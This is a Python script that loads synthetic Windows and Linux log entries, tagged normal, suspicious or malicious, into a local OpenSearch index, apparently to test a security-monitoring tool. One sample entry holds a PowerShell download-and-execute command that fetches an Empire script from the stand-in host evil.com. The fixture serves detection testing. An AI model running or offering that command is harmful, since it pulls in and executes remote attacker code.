# scripts/ingest_sample.py
from opensearchpy import OpenSearch
from datetime import datetime
import time
import random

# Connect to your Docker OpenSearch (no auth in dev mode)
client = OpenSearch(
    hosts=[{"host": "localhost", "port": 9201}],
    http_compress=True,
    use_ssl=False,
    verify_certs=False,
    ssl_show_warn=False
)

# Sample realistic SME logs (Windows + Linux mixed)
sample_logs = [
    # Normal stuff
    {"@timestamp": "2025-12-12T09:00:00", "host": "WIN-CLIENT01", "event_id": 4624, "action": "login_success", "user": "alice", "risk": "normal"},
    {"@timestamp": "2025-12-12T09:05:00", "host": "UBUNTU-SRV01", "log": "Accepted password for bob from 10.10.1.55", "risk": "normal"},
    
    # Suspicious
    {"@timestamp": "2025-12-12T10:00:00", "host": "WIN-CLIENT01", "event_id": 4625, "action": "failed_login", "user": "admin", "count": 47, "risk": "suspicious"},
    {"@timestamp": "2025-12-12T10:01:00", "host": "WIN-CLIENT01", "event_id": 4107, "action": "powershell_download", "command": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/empire.ps1')", "risk": "malicious"},
    
    # Lateral movement
    {"@timestamp": "2025-12-12T10:10:00", "host": "WIN-SRV02", "event_id": 5145, "action": "network_share_access", "share": "\\\\WIN-CLIENT01\\C$", "user": "admin", "risk": "malicious"},
    
    # Exfil attempt
    {"@timestamp": "2025-12-12T10:15:00", "host": "UBUNTU-SRV01", "log": "Large outbound transfer 1.4GB to 185.45.192.33", "risk": "malicious"},
]

print("Sending sample logs into OpenSearch...")

for log in sample_logs:
    # Add real timestamp
    log["@timestamp"] = datetime.utcnow().isoformat()
    
    # Send to index called "riskpulse-logs"
    response = client.index(
        index="riskpulse-logs",
        body=log,
        refresh=True  # makes it instantly searchable
    )
    print(f"Indexed: {log['risk']:>10} | {log.get('action','') or log.get('log','')[:50]}")

print("\nDone! Sample logs ingested into OpenSearch index 'riskpulse-logs'.")
